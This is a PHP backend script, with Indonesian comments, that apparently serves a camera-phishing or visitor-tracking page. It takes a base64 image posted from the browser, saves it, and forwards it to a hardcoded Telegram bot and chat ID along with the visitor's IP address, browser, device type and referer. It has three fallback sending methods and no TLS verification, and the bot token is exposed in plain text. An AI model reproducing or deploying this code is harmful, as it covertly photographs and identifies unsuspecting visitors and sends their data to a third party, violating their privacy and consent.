<?php
// Enable error reporting untuk debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

$data = json_decode(file_get_contents("php://input"), true);

// Log received data
file_put_contents('debug.log', "[" . date('Y-m-d H:i:s') . "] Data received\n", FILE_APPEND);

if (isset($data['image'])) {
    $image = $data['image'];
    $image = str_replace('data:image/png;base64,', '', $image);
    $image = str_replace(' ', '+', $image);
    $imageData = base64_decode($image);
    
    // Buat folder uploads jika belum ada
    if (!is_dir('uploads')) {
        mkdir('uploads', 0755, true);
    }
    
    $fileName = 'uploads/photo_' . time() . '_' . uniqid() . '.png';
    
    if (file_put_contents($fileName, $imageData)) {
        file_put_contents('debug.log', "[" . date('Y-m-d H:i:s') . "] File saved: $fileName\n", FILE_APPEND);
        sendToTelegram($fileName);
        echo json_encode(['status' => 'success', 'message' => 'Photo saved and sent']);
    } else {
        file_put_contents('debug.log', "[" . date('Y-m-d H:i:s') . "] Failed to save file\n", FILE_APPEND);
        echo json_encode(['status' => 'error', 'message' => 'Failed to save photo']);
    }
} else {
    file_put_contents('debug.log', "[" . date('Y-m-d H:i:s') . "] No image data received\n", FILE_APPEND);
    echo json_encode(['status' => 'error', 'message' => 'No image data']);
}

function sendToTelegram($filePath) {
    $botToken = '8364972198:AAHBBW0kTvyeIbDjZQPJeUZxa6TNfYLMEk0';
    $chatId = '7418584938';
    
    // Get client information
    $ipAddress = getClientIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $time = date('Y-m-d H:i:s');
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
    
    // Detect device type
    $deviceType = 'Desktop';
    if (strpos($userAgent, 'Mobile') !== false) $deviceType = 'Mobile';
    if (strpos($userAgent, 'Tablet') !== false) $deviceType = 'Tablet';
    
    // Create caption message
    $caption = "🚨 **DATA BARU DITERIMA** 🚨\n\n"
             . "📍 **IP Address:** `$ipAddress`\n"
             . "🖥️ **Device:** $deviceType\n"
             . "🌐 **Browser:** " . substr($userAgent, 0, 50) . "...\n"
             . "🔗 **Referer:** " . (strlen($referer) > 30 ? substr($referer, 0, 30) . '...' : $referer) . "\n"
             . "🕒 **Waktu:** $time\n\n"
             . "⚠️ **Data tersimpan otomatis ke server**";

    // Try multiple methods to send to Telegram
    
    // Method 1: Using cURL (most reliable)
    if (function_exists('curl_init')) {
        if (sendWithCurl($botToken, $chatId, $filePath, $caption)) {
            return true;
        }
    }
    
    // Method 2: Using file_get_contents with multipart
    if (sendWithFileGetContents($botToken, $chatId, $filePath, $caption)) {
        return true;
    }
    
    // Method 3: Send as document if photo fails
    sendAsDocument($botToken, $chatId, $filePath, $caption);
}

function sendWithCurl($botToken, $chatId, $filePath, $caption) {
    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
    
    $postData = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($filePath)),
        'caption' => $caption,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    file_put_contents('debug.log', "[" . date('Y-m-d H:i:s') . "] cURL - HTTP: $httpCode\n", FILE_APPEND);
    
    curl_close($ch);
    
    return $httpCode === 200;
}

function sendWithFileGetContents($botToken, $chatId, $filePath, $caption) {
    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
    
    $boundary = '----WebKitFormBoundary' . uniqid();
    $fileContent = file_get_contents($filePath);
    
    $body = "--{$boundary}\r\n"
          . "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
          . "{$chatId}\r\n"
          . "--{$boundary}\r\n"
          . "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
          . "{$caption}\r\n"
          . "--{$boundary}\r\n"
          . "Content-Disposition: form-data; name=\"photo\"; filename=\"photo.png\"\r\n"
          . "Content-Type: image/png\r\n\r\n"
          . $fileContent . "\r\n"
          . "--{$boundary}--\r\n";
    
    $options = [
        'http' => [
            'header' => "Content-Type: multipart/form-data; boundary={$boundary}\r\n",
            'method' => 'POST',
            'content' => $body,
            'timeout' => 10
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    file_put_contents('debug.log', "[" . date('Y-m-d H:i:s') . "] file_get_contents result: " . ($result ? 'Success' : 'Failed') . "\n", FILE_APPEND);
    
    return $result !== false;
}

function sendAsDocument($botToken, $chatId, $filePath, $caption) {
    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
    
    $postData = [
        'chat_id' => $chatId,
        'document' => new CURLFile(realpath($filePath)),
        'caption' => $caption
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    file_put_contents('debug.log', "[" . date('Y-m-d H:i:s') . "] Sent as document\n", FILE_APPEND);
}

function getClientIP() {
    $ipKeys = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = $_SERVER[$key];
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                $ip = trim($ips[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    
    return 'Unknown';
}
?>